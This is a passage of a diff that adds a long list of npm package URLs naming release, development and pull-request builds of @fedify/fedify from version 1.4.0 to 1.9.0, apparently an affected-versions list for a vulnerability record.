+      - pkg:npm/%40fedify/fedify@1.4.0-dev.595
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.596
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.598
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.599
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.607
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.610
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.612
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.613
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.617
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.618
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.620
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.623
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.624
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.625
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.628
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.629
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.630
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.632
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.633
+      - pkg:npm/%40fedify/fedify@1.4.0-dev.634
+      - pkg:npm/%40fedify/fedify@1.4.0
+      - pkg:npm/%40fedify/fedify@1.4.1
+      - pkg:npm/%40fedify/fedify@1.4.2
+      - pkg:npm/%40fedify/fedify@1.4.3
+      - pkg:npm/%40fedify/fedify@1.4.4
+      - pkg:npm/%40fedify/fedify@1.4.5
+      - pkg:npm/%40fedify/fedify@1.4.6
+      - pkg:npm/%40fedify/fedify@1.4.7
+      - pkg:npm/%40fedify/fedify@1.4.8
+      - pkg:npm/%40fedify/fedify@1.4.9
+      - pkg:npm/%40fedify/fedify@1.4.10
+      - pkg:npm/%40fedify/fedify@1.4.11
+      - pkg:npm/%40fedify/fedify@1.4.12
+      - pkg:npm/%40fedify/fedify@1.4.13
+      - pkg:npm/%40fedify/fedify@1.4.14
+      - pkg:npm/%40fedify/fedify@1.4.15
+      - pkg:npm/%40fedify/fedify@1.4.16
+      - pkg:npm/%40fedify/fedify@1.4.17
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.636
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.637
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.639
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.640
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.641
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.642
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.648
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.649
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.651
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.652
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.653
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.654
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.655
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.656
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.665
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.667
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.672
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.678
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.679
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.680
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.686
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.692
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.693
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.694
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.695
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.696
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.697
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.698
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.699
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.709
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.714
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.715
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.717
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.718
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.729
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.730
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.731
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.732
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.738
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.745
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.749
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.750
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.751
+      - pkg:npm/%40fedify/fedify@1.5.0-dev.752
+      - pkg:npm/%40fedify/fedify@1.5.0
+      - pkg:npm/%40fedify/fedify@1.5.1
+      - pkg:npm/%40fedify/fedify@1.5.2
+      - pkg:npm/%40fedify/fedify@1.5.3
+      - pkg:npm/%40fedify/fedify@1.5.4
+      - pkg:npm/%40fedify/fedify@1.5.5
+      - pkg:npm/%40fedify/fedify@1.5.6
+      - pkg:npm/%40fedify/fedify@1.5.7
+      - pkg:npm/%40fedify/fedify@1.5.8
+      - pkg:npm/%40fedify/fedify@1.5.9
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.754
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.755
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.756
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.757
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.765
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.766
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.767
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.768
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.769
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.770
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.771
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.772
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.773
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.775
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.776
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.777
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.778
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.790
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.795
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.796
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.797
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.798
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.800
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.808
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.809
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.810
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.811
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.812
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.813
+      - pkg:npm/%40fedify/fedify@1.6.0-dev.814
+      - pkg:npm/%40fedify/fedify@1.6.0-experiment.0
+      - pkg:npm/%40fedify/fedify@1.6.0
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.826
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.828
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.829
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.830
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.831
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.832
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.834
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.837
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.841
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.843
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.845
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.847
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.849
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.851
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.856
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.869
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.871
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.873
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.876
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.877
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.880
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.881
+      - pkg:npm/%40fedify/fedify@1.6.1-dev.883
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.237.838
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.237.840
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.237.842
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.237.844
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.237.846
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.237.848
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.237.850
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.239.854
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.239.855
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.857
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.858
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.860
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.861
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.862
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.863
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.864
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.865
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.866
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.867
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.868
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.242.870
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.245.872
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.246.875
+      - pkg:npm/%40fedify/fedify@1.6.1-pr.247.882
+      - pkg:npm/%40fedify/fedify@1.6.1
+      - pkg:npm/%40fedify/fedify@1.6.2
+      - pkg:npm/%40fedify/fedify@1.6.3
+      - pkg:npm/%40fedify/fedify@1.6.4
+      - pkg:npm/%40fedify/fedify@1.6.5
+      - pkg:npm/%40fedify/fedify@1.6.6-pr.295.997
+      - pkg:npm/%40fedify/fedify@1.6.6-pr.295.998
+      - pkg:npm/%40fedify/fedify@1.6.6-pr.295.999
+      - pkg:npm/%40fedify/fedify@1.6.6
+      - pkg:npm/%40fedify/fedify@1.6.7-dev.1125
+      - pkg:npm/%40fedify/fedify@1.6.7-pr.324.1126
+      - pkg:npm/%40fedify/fedify@1.6.7
+      - pkg:npm/%40fedify/fedify@1.6.8
+      - pkg:npm/%40fedify/fedify@1.6.9
+      - pkg:npm/%40fedify/fedify@1.6.10
+      - pkg:npm/%40fedify/fedify@1.6.11
+      - pkg:npm/%40fedify/fedify@1.6.12
+      - pkg:npm/%40fedify/fedify@1.6.13
+      - pkg:npm/%40fedify/fedify@1.6.14
+      - pkg:npm/%40fedify/fedify@1.6.15
+      - pkg:npm/%40fedify/fedify@1.7.0-dev.887
+      - pkg:npm/%40fedify/fedify@1.7.0-dev.888
+      - pkg:npm/%40fedify/fedify@1.7.0-dev.892
+      - pkg:npm/%40fedify/fedify@1.7.0-dev.893
+      - pkg:npm/%40fedify/fedify@1.7.0-dev.896
+      - pkg:npm/%40fedify/fedify@1.7.0-dev.897
+      - pkg:npm/%40fedify/fedify@1.7.0-pr.251.885
+      - pkg:npm/%40fedify/fedify@1.7.0-pr.251.886
+      - pkg:npm/%40fedify/fedify@1.7.0
+      - pkg:npm/%40fedify/fedify@1.7.1
+      - pkg:npm/%40fedify/fedify@1.7.2
+      - pkg:npm/%40fedify/fedify@1.7.3
+      - pkg:npm/%40fedify/fedify@1.7.4
+      - pkg:npm/%40fedify/fedify@1.7.5-dev.996
+      - pkg:npm/%40fedify/fedify@1.7.5-pr.293.995
+      - pkg:npm/%40fedify/fedify@1.7.5
+      - pkg:npm/%40fedify/fedify@1.7.6
+      - pkg:npm/%40fedify/fedify@1.7.7-pr.335.1200
+      - pkg:npm/%40fedify/fedify@1.7.7
+      - pkg:npm/%40fedify/fedify@1.7.8-dev.1212
+      - pkg:npm/%40fedify/fedify@1.7.8-pr.352.1315
+      - pkg:npm/%40fedify/fedify@1.7.8
+      - pkg:npm/%40fedify/fedify@1.7.9
+      - pkg:npm/%40fedify/fedify@1.7.10
+      - pkg:npm/%40fedify/fedify@1.7.11
+      - pkg:npm/%40fedify/fedify@1.7.12
+      - pkg:npm/%40fedify/fedify@1.7.13
+      - pkg:npm/%40fedify/fedify@1.7.14
+      - pkg:npm/%40fedify/fedify@1.7.15
+      - pkg:npm/%40fedify/fedify@1.7.16
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.909
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.910
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.913
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.914
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.915
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.923
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.924
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.926
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.927
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.929
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.930
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.931
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.932
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.933
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.935
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.936
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.938
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.952
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.955
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.959
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.967
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.986
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.991
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1003
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1004
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1015
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1019
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1021
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1049
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1052
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1073
+      - pkg:npm/%40fedify/fedify@1.8.0-dev.1084
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.278.944
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.278.945
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.278.948
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.278.951
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.278.954
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.282.963
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.284.976
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.284.977
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.284.978
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.285.985
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.298.1006
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.298.1011
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.298.1012
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.298.1013
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.298.1016
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.298.1017
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.298.1018
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.299.1007
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.299.1020
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.300.1008
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.300.1010
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.307.1050
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.307.1051
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.308.1045
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.308.1047
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.308.1048
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1053
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1062
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1063
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1069
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1070
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1071
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1072
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1076
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1078
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1079
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1080
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.309.1081
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.312.1064
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.312.1065
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.312.1066
+      - pkg:npm/%40fedify/fedify@1.8.0-pr.312.1067
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1085
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1110
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1129
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1166
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1192
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1196
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1202
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1208
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1213
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1219
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1227
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1231
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1233
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1237
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1238
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1246
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1247
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1251
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1257
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1260
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1261
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1262
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1263
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1291
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1294
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1318
+      - pkg:npm/%40fedify/fedify@1.8.1-dev.1324
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.283.1138
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.283.1150
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.314.1086
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1087
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1089
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1090
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1091
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1275
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1276
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1286
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1290
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.315.1293
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.318.1225
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.318.1226
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.318.1252
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.318.1253
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.321.1139
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.321.1140
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.321.1145
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.321.1147
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.321.1152
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.322.1108
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.324.1113
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.327.1131
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.328.1154
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.328.1159
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.328.1165
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.329.1205
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.329.1209
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.331.1169
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.331.1172
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.331.1173
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.331.1174
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.331.1177
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.331.1178
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.332.1179
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.332.1180
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.332.1182
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.332.1203
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.332.1206
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.332.1207
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.334.1193
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1211
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1221
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1222
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1223
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1267
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1268
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1300
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1301
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1302
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1303
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1310
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1311
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1312
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1316
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1320
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1321
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1322
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.339.1323
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.340.1214
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.341.1217
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.341.1218
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.341.1240
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.341.1241
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.341.1243
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.341.1248
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.341.1249
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.342.1228
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.342.1229
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.343.1230
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.344.1236
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.345.1242
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.345.1244
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.345.1245
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.347.1259
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.348.1271
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.348.1272
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.348.1281
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.349.1278
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.349.1297
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.349.1313
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.350.1284
+      - pkg:npm/%40fedify/fedify@1.8.1-pr.350.1285
+      - pkg:npm/%40fedify/fedify@1.8.1
+      - pkg:npm/%40fedify/fedify@1.8.2
+      - pkg:npm/%40fedify/fedify@1.8.3
+      - pkg:npm/%40fedify/fedify@1.8.4
+      - pkg:npm/%40fedify/fedify@1.8.5-dev.1340
+      - pkg:npm/%40fedify/fedify@1.8.5-pr.360.1336
+      - pkg:npm/%40fedify/fedify@1.8.5-pr.360.1339
+      - pkg:npm/%40fedify/fedify@1.8.5
+      - pkg:npm/%40fedify/fedify@1.8.6-dev.1411
+      - pkg:npm/%40fedify/fedify@1.8.6-pr.382.1412
+      - pkg:npm/%40fedify/fedify@1.8.6-pr.386.1417
+      - pkg:npm/%40fedify/fedify@1.8.6-pr.386.1420
+      - pkg:npm/%40fedify/fedify@1.8.6-pr.386.1421
+      - pkg:npm/%40fedify/fedify@1.8.6
+      - pkg:npm/%40fedify/fedify@1.8.7
+      - pkg:npm/%40fedify/fedify@1.8.8
+      - pkg:npm/%40fedify/fedify@1.8.9
+      - pkg:npm/%40fedify/fedify@1.8.10
+      - pkg:npm/%40fedify/fedify@1.8.11
+      - pkg:npm/%40fedify/fedify@1.8.12
+      - pkg:npm/%40fedify/fedify@1.8.13
+      - pkg:npm/%40fedify/fedify@1.8.14-dev.1853
+      - pkg:npm/%40fedify/fedify@1.8.14-pr.470.1821
+      - pkg:npm/%40fedify/fedify@1.8.14-pr.470.1823
+      - pkg:npm/%40fedify/fedify@1.8.14-pr.470.1832
+      - pkg:npm/%40fedify/fedify@1.8.14-pr.470.1835
+      - pkg:npm/%40fedify/fedify@1.8.14-pr.470.1850
+      - pkg:npm/%40fedify/fedify@1.8.14-pr.470.1851
+      - pkg:npm/%40fedify/fedify@1.8.14-pr.470.1852
+      - pkg:npm/%40fedify/fedify@1.8.14
+      - pkg:npm/%40fedify/fedify@1.8.15-dev.1889
+      - pkg:npm/%40fedify/fedify@1.8.15
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1328
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1335
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1357
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1366
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1368
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1372
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1380
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1381
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1385
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1388
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1390
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1399
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1404
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1406
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1408
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1415
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1425
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1426
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1461
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1482
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1501
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1502
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1506
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1516
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1519
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1585
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1589
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1605
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1613
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1668
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1689
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1704
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1723
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1732
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1737
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1743
+      - pkg:npm/%40fedify/fedify@1.9.0-dev.1748
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.355.1353
+      - pkg:npm/%40fedify/fedify@1.9.0-pr.355.1354
